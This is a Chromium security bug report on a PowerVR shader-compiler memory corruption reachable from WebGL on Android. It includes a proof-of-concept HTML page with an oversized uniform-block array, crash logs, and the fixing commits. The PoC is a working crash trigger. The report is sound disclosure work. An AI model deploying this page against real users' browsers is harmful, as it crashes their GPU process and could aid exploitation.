# memory corruption in llvm::UFWriterVolcanic::GenerateKernels casue chrome sandbox escape

| Field | Value |
|-------|-------|
| **Issue ID** | [475877320](https://issues.chromium.org/issues/475877320) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Dawn>Tint, Internals>GPU>Internals |
| **Platforms** | Android |
| **Reporter** | ha...@gmail.com |
| **Assignee** | ge...@chromium.org |
| **Created** | 2026-01-15 |
| **Bounty** | $25,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

VULNERABILITY DETAILS

The lack of shader filtering for WebGL caused an issue with llvm::ComputeInfo::IsGlobalUsedBy.

VERSION Chrome Version: [143.0.7499.292 + stable]

Operating System: [pixel 10 update 01.06]

REPRODUCTION CASE

1.open poc.html

```
<!DOCTYPE html>
<html>
<head>
    <title>WebGL Uniform Block Crash</title>
</head>
<body>
    <canvas id="glCanvas" width="100" height="100"></canvas>

    <script>
        const canvas = document.getElementById('glCanvas');
        const gl = canvas.getContext('webgl2');
        
        if (!gl) {
            alert('WebGL 2 not supported');
        } else {
            console.log('Testing crash shader...');
            
            const vsSource = `#version 300 es
layout(std140) uniform MyBlock { 
    float x; 
} blocks[128];

void main() {
    gl_Position = vec4(blocks[127].x);
}`;

            const fsSource = `#version 300 es
precision mediump float;
out vec4 fragColor;
void main() {
    fragColor = vec4(1.0, 0.0, 0.0, 1.0);
}`;

            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, vsSource);
            gl.compileShader(vertexShader);
            
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(fragmentShader);

            const program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);

        }
    </script>
</body>
</html>

```

2.crash

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

```
01-15 13:31:06.831 13140 13140 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
01-15 13:31:06.831 13140 13140 F DEBUG   : Build fingerprint: 'google/frankel/frankel:16/BP4A.260105.004.E1/14587043:user/release-keys'
01-15 13:31:06.831 13140 13140 F DEBUG   : Kernel Release: '6.6.98-android15-8-g4b48560cd07d-ab14239520-4k'
01-15 13:31:06.831 13140 13140 F DEBUG   : Revision: 'MP1.0'
01-15 13:31:06.831 13140 13140 F DEBUG   : ABI: 'arm64'
01-15 13:31:06.831 13140 13140 F DEBUG   : Timestamp: 2026-01-15 13:31:06.711616662+0800
01-15 13:31:06.831 13140 13140 F DEBUG   : Process uptime: 2s
01-15 13:31:06.831 13140 13140 F DEBUG   : Executable: /system/bin/app_process64
01-15 13:31:06.831 13140 13140 F DEBUG   : Cmdline: com.android.chrome:privileged_process0
01-15 13:31:06.831 13140 13140 F DEBUG   : pid: 13045, tid: 13060, name: CrGpuMain  >>> com.android.chrome:privileged_process0 <<<
01-15 13:31:06.831 13140 13140 F DEBUG   : uid: 10214
01-15 13:31:06.831 13140 13140 F DEBUG   : tagged_addr_ctrl: 000000000007fff7 (PR_TAGGED_ADDR_ENABLE, PR_MTE_TCF_SYNC, PR_MTE_TCF_ASYNC, mask 0xfffe)
01-15 13:31:06.831 13140 13140 F DEBUG   : pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
01-15 13:31:06.831 13140 13140 F DEBUG   : esr: 0000000092000005 (Data Abort Exception 0x24)
01-15 13:31:06.831 13140 13140 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x00000075555e24a1 (read)
01-15 13:31:06.831 13140 13140 F DEBUG   :     x0  0000000000000000  x1  00000071a4677b85  x2  000000000000001c  x3  000000000000001c
01-15 13:31:06.831 13140 13140 F DEBUG   :     x4  000001c6919dee14  x5  04000071f752bd10  x6  0000000000000010  x7  0000000000000000
01-15 13:31:06.831 13140 13140 F DEBUG   :     x8  00000075555e24a9  x9  0000000000000010  x10 030000724754fc70  x11 000000000000000f
01-15 13:31:06.831 13140 13140 F DEBUG   :     x12 030000724754fcf8  x13 0000000000000002  x14 00000000260c81e2  x15 05000073d7524110
01-15 13:31:06.831 13140 13140 F DEBUG   :     x16 00000071a7144f38  x17 00000071a5c88d30  x18 00000071549b8000  x19 05000073675c2cd0
01-15 13:31:06.831 13140 13140 F DEBUG   :     x20 00000071555e1da8  x21 0c000072175862b0  x22 0e000073574fa618  x23 03000073d751fd78
01-15 13:31:06.831 13140 13140 F DEBUG   :     x24 0000000000000000  x25 00000075555e24a1  x26 00000071555e20f0  x27 0000000000000001
01-15 13:31:06.831 13140 13140 F DEBUG   :     x28 00000071555e7640  x29 00000071555e1d30
01-15 13:31:06.831 13140 13140 F DEBUG   :     lr  0004baf1a505d3bc  sp  00000071555e1b70  pc  00000071a505d490  pst 0000000060001000
01-15 13:31:06.831 13140 13140 F DEBUG   :     esr 0000000092000005
01-15 13:31:06.831 13140 13140 F DEBUG   : 38 total frames
01-15 13:31:06.831 13140 13140 F DEBUG   : backtrace:
01-15 13:31:06.831 13140 13140 F DEBUG   :       #00 pc 0000000000f28490  /vendor/lib64/libufwriter.so (llvm::UFWriterVolcanic::GenerateKernels(llvm::Module&, llvm::SetVector<llvm::Function*, std::__1::vector<llvm::Function*, std::__1::allocator<llvm::Function*>>, llvm::DenseSet<llvm::Function*, llvm::DenseMapInfo<llvm::Function*>>> const&)+4944) (BuildId: 3669c3a3441cf03574357745e0fc3241)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #01 pc 0000000000f2b25c  /vendor/lib64/libufwriter.so (llvm::UFWriterPass::run(llvm::Module&, llvm::AnalysisManager<llvm::Module>&)+1020) (BuildId: 3669c3a3441cf03574357745e0fc3241)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #02 pc 0000000001646100  /vendor/lib64/libufwriter.so (llvm::PassManager<llvm::Module, llvm::AnalysisManager<llvm::Module>>::run(llvm::Module&, llvm::AnalysisManager<llvm::Module>&)+752) (BuildId: 3669c3a3441cf03574357745e0fc3241)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #03 pc 0000000000d48cd8  /vendor/lib64/libufwriter.so (GenerateICodeProgram+8904) (BuildId: 3669c3a3441cf03574357745e0fc3241)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #04 pc 0000000000c93d64  /vendor/lib64/libufwriter.so (GLSLCompileToIntermediateCode+1220) (BuildId: 3669c3a3441cf03574357745e0fc3241)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #05 pc 0000000000c94218  /vendor/lib64/libufwriter.so (GLSLCompileToUniflex+776) (BuildId: 3669c3a3441cf03574357745e0fc3241)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #06 pc 0000000000121244  /vendor/lib64/egl/libGLESv2_powervr.so (DoCompileShader(GLES3Context_TAG*, GLES3DeferredShaderCompileContextRec*, GLES3CompilerAppHintSetupRec const*, GLSLProgramTypeTAG, char const*, GLSLIntermediateTAG const*, GLES3RecompiledShaderConditionRec*, GLES3CompiledShaderStateRec*, unsigned int, GLES3ShaderRec*) (.__uniq.240097599076884967950137398077872991440)+644) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #07 pc 000000000011fa9c  /vendor/lib64/egl/libGLESv2_powervr.so (CompileShader+252) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #08 pc 000000000011aa24  /vendor/lib64/egl/libGLESv2_powervr.so (glCompileShader+100) (BuildId: 5c09bdbf5bedc8055689e500629872cc)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #09 pc 0000000008b15f90  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #10 pc 0000000008b092d4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #11 pc 0000000008abafac  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #12 pc 0000000008ad18dc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #13 pc 000000000722a70c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #14 pc 00000000072299e4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #15 pc 00000000072296d0  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #16 pc 000000000722957c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #17 pc 00000000072293dc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #18 pc 0000000006f84c54  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #19 pc 00000000073437fc  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #20 pc 00000000058cbe18  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #21 pc 0000000005867ac4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #22 pc 000000000586762c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #23 pc 0000000007297504  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #24 pc 00000000058d4ff4  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #25 pc 0000000005846a8c  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #26 pc 000000000580f3d8  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #27 pc 000000000580f114  /data/app/~~BhDlB9g51UI2TbMkvLMy4w==/com.google.android.trichromelibrary_749919233-OYhrBD_MCD4kZPxRYUMPCA==/base.apk!libmonochrome_64.so (offset 0x930000) (BuildId: bbae41948ca5afe4814da3aee16cf773f4f3bd00)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #28 pc 0000000000d47db0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (art_jni_trampoline+112)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #29 pc 00000000006687e8  /apex/com.android.art/lib64/libart.so (nterp_helper+152) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #30 pc 00000000000e8512  /data/app/~~P2wdVVU8W9YxL5iR_gR99Q==/com.android.chrome-mlNR9WbC-u7OgTPpVwYrsg==/base.apk (offset 0x1b0000) (ak3.run+562)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #31 pc 000000000031d5f0  /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat (java.lang.Thread.run+64)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #32 pc 00000000002cdd94  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+612) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #33 pc 000000000026e624  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+220) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #34 pc 00000000004c3f30  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1184) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #35 pc 00000000004c3a80  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: be34fbe63ff357beb403f9cb39923ea7)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #36 pc 000000000008a314  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)
01-15 13:31:06.831 13140 13140 F DEBUG   :       #37 pc 000000000007b1f4  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+68) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37)


```

same as issues <https://issues.chromium.org/issues/379551588>

Reporter credit: Goodluck

## Timeline

### wf...@chromium.org (2026-01-15)

Thanks for your report. I haven't reproduced this but given the report providence I am inclined to simply triage in a similar way to previous issues. Adding the relevant tags.

### wf...@chromium.org (2026-01-15)

This might be S0, clarifying with the team, and will update. For the time being assigning sev-high.

### ch...@google.com (2026-01-16)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-01-16)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ch...@google.com (2026-01-30)

geofflang: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### jo...@google.com (2026-01-30)

Testing with the IMG offline compiler it seems the VS is the problematic case here.
We will track this internally in [b/480108811](https://issues.chromium.org/issues/480108811) and update here eventually.

### ha...@gmail.com (2026-01-31)

deleted

### ge...@google.com (2026-02-11)

For what it's worth, I dumped the translated shader that we pass to the driver. It doesn't appear significantly different than the WebGL one:

```
#version 300 es
layout(std140) uniform webgl_5c114aa845139bca{
  highp float webgl_4fc82888d13de398;
} webgl_780ef26e7ffd4d80[128];
void main(){
  (gl_Position = vec4(0.0, 0.0, 0.0, 0.0));
  (gl_Position = vec4(webgl_780ef26e7ffd4d80[127].webgl_4fc82888d13de398));
}

```

### ge...@google.com (2026-02-11)

I tried reducing the array sizes of the uniform:

Using an array size of 16 compiles successfully.

Using an array size of 32 generates a different crash stack:

```
#version 300 es
layout(std140) uniform webgl_5c114aa845139bca{
  highp float webgl_4fc82888d13de398;
} webgl_780ef26e7ffd4d80[32];
void main(){
  (gl_Position = vec4(0.0, 0.0, 0.0, 0.0));
  (gl_Position = vec4(webgl_780ef26e7ffd4d80[31].webgl_4fc82888d13de398));
}

```
```
Symbolizing stack using ABI: arm64
Build fingerprint: 'google/blazer/blazer:16/BP4A.260205.001/14624666:user/release-keys'
Revision: 'MP1.0'
org.chromium.chrome.browser.ntp_customization.edge_to_edge.TopInsetCoordinator$3: 10426, tid: 10454, name: CrGpuMain  >>> org.chromium.chrome:privileged_process0 <<<
signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr --------
Abort message: 'Scudo ERROR: misaligned pointer when reallocating address 0x200000000000001'

Stack Trace:
  RELADDR   FUNCTION                                                                          FILE:LINE
  0000000000077880  abort+160) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37                             /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005cf1c  scudo::die()+12) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37                       /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005dc40  scudo::reportRawError(char const*)+32) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005dba0  scudo::ScopedErrorReport::~ScopedErrorReport()+16) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005e098  scudo::reportMisalignedPointer(scudo::AllocatorAction, void const*)+120) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37  /apex/com.android.runtime/lib64/bionic/libc.so
  00000000000601d0  scudo::Allocator<scudo::AndroidNormalConfig, &scudo_malloc_postinit>::reallocate(void*, unsigned long, unsigned long)+592) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000005fef0  scudo_realloc+48) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37                      /apex/com.android.runtime/lib64/bionic/libc.so
  00000000000599f4  realloc+100) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37                           /apex/com.android.runtime/lib64/bionic/libc.so
  0000000000c9627c  AddToRangeList+92) (BuildId: 3669c3a3441cf03574357745e0fc3241                     /vendor/lib64/libufwriter.so
  0000000000d1c520  AssignHWSymbolRegisters(GLSLCompilerPrivateDataTAG*, GLSLUniFlexContextTAG*, HWSYMBOL_TAG&, glsl::llvmGlobalInfo::globalInfo const&, std::__1::map<unsigned int, GLSLVertexOutputRemapInfoTAG, std::__1::less<unsigned int>, std::__1::allocator<std::__1::pair<unsigned int const, GLSLVertexOutputRemapInfoTAG>>>&, glsl::llvmGlobalInfo const&)+1680) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d1a008  FinaliseUFContext+3752) (BuildId: 3669c3a3441cf03574357745e0fc3241                /vendor/lib64/libufwriter.so
  0000000000d49e2c  GenerateUniFlexInput+3292) (BuildId: 3669c3a3441cf03574357745e0fc3241             /vendor/lib64/libufwriter.so
  0000000000c9433c  GLSLCompileToUniflex+1068) (BuildId: 3669c3a3441cf03574357745e0fc3241             /vendor/lib64/libufwriter.so
  0000000000121244  DoCompileShader(GLES3Context_TAG*, GLES3DeferredShaderCompileContextRec*, GLES3CompilerAppHintSetupRec const*, GLSLProgramTypeTAG, char const*, GLSLIntermediateTAG const*, GLES3RecompiledShaderConditionRec*, GLES3CompiledShaderStateRec*, unsigned int, GLES3ShaderRec*) (.__uniq.240097599076884967950137398077872991440)+644) (BuildId: 5c09bdbf5bedc8055689e500629872cc  /vendor/lib64/egl/libGLESv2_powervr.so
  000000000011fa9c  CompileShader+252) (BuildId: 5c09bdbf5bedc8055689e500629872cc                     /vendor/lib64/egl/libGLESv2_powervr.so
  000000000011aa24  glCompileShader+100) (BuildId: 5c09bdbf5bedc8055689e500629872cc                   /vendor/lib64/egl/libGLESv2_powervr.so
  0000000008f9681c  gpu::gles2::Shader::DoCompile()                                                   ../../gpu/command_buffer/service/shader_manager.cc:104:3

```

### ge...@google.com (2026-02-11)

Typically we wait until program link time to validate that all uniforms are within limits since not everything can be validated at compile time. I will try to move the uniform block count validation to a compile time failure.

### dx...@google.com (2026-02-13)

Project: angle/angle  

Branch:  main  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7568089>

Optionally validate GL\_MAX\_\*\_UNIFORM\_BLOCKS at compile time.

---


Expand for full commit details
```
     
    These were validated at link time but some drivers have compiler crashes 
    when compiling shaders with too many uniform blocks. 
     
    Bug: chromium:475877320 
    Change-Id: I4413ce06307b4fe9e27105d85f66f610c235a301 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7568089 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

```

---

Files:

- M `include/GLSLANG/ShaderLang.h`
- M `include/platform/autogen/FeaturesGL_autogen.h`
- M `include/platform/gl_features.json`
- M `src/compiler/translator/Compiler.cpp`
- M `src/compiler/translator/ParseContext.cpp`
- M `src/compiler/translator/ParseContext.h`
- M `src/compiler/translator/ShaderLang.cpp`
- M `src/libANGLE/Compiler.cpp`
- M `src/libANGLE/renderer/gl/ShaderGL.cpp`
- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`
- M `src/tests/gl_tests/GLSLValidationTest.cpp`
- M `util/autogen/angle_features_autogen.cpp`
- M `util/autogen/angle_features_autogen.h`

---

Hash: [bf6dd974238bceec7a0a27987e2e02e177f2b7f8](https://chromiumdash.appspot.com/commit/bf6dd974238bceec7a0a27987e2e02e177f2b7f8)  

Date: Wed Feb 11 20:51:46 2026


---

### dx...@google.com (2026-02-13)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7573944>

Roll ANGLE from 0e3297d59cbc to bf6dd974238b (9 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/0e3297d59cbc..bf6dd974238b 
     
    2026-02-13 geofflang@chromium.org Optionally validate GL_MAX_*_UNIFORM_BLOCKS at compile time. 
    2026-02-13 hoonee.cho@samsung.com OpenCL: strip reflection info if unsupported in VK 
    2026-02-12 lexa.knyazev@gmail.com Refactor robust buffer pointer query 
    2026-02-12 syoussefi@chromium.org IR: Return VariableId and TypedId together when declaring vars 
    2026-02-12 syoussefi@chromium.org Fix multiview emulation vs #extension all 
    2026-02-12 syoussefi@chromium.org Translator: Simplify some option checks 
    2026-02-12 lexa.knyazev@gmail.com Refactor robust buffer parameter queries 
    2026-02-12 ynovikov@chromium.org Suppress flaky end2end test on Linux NVIDIA GL 
    2026-02-12 syoussefi@chromium.org IR: Set num_views globally 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,geofflang@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:475877320 
    Tbr: geofflang@google.com 
    Change-Id: Ib2e03a67ba6b517a44b4dbb44f43aeacf6babc46 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7573944 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1584408}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [93655e5a612f721663a5c0eee3b667ccb49bdac4](https://chromiumdash.appspot.com/commit/93655e5a612f721663a5c0eee3b667ccb49bdac4)  

Date: Fri Feb 13 03:23:05 2026


---

### dx...@google.com (2026-02-18)

Project: chromium/src  

Branch:  main  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7568129>

Validate uniform block count limits at compile time on IMG.

---


Expand for full commit details
```
     
    Normally these limits are validated at link time but the IMG compiler 
    has issues when these limits are exceeded. Validate at compile time 
    instead. 
     
    Bug: chromium:475877320 
    Change-Id: Ieeed6914b8cdd2b5e50242d06facae62badddefd 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7568129 
    Auto-Submit: Geoff Lang <geofflang@chromium.org> 
    Reviewed-by: Kyle Charbonneau <kylechar@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1586673}

```

---

Files:

- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

Hash: [fbfb27470bf6b7bff084d9290e26c1afb52ebed5](https://chromiumdash.appspot.com/commit/fbfb27470bf6b7bff084d9290e26c1afb52ebed5)  

Date: Wed Feb 18 21:54:37 2026


---

### jo...@google.com (2026-02-20)

A driver fix has been landed to not crash the compiler but to fail gracefully when exceeding this limit. It is available since builds ZP1A.260213.001/CP2A.260213.001.

### ha...@gmail.com (2026-02-28)

Is the reward-topanel flag missing?

### dr...@chromium.org (2026-03-02)

Moving it back to the Chrome tracker so the Chromium vulnerability automation can do things like reward-topanel.

### ch...@google.com (2026-03-02)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-03)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1586673) appears to be after extended stable branch point (1552494).
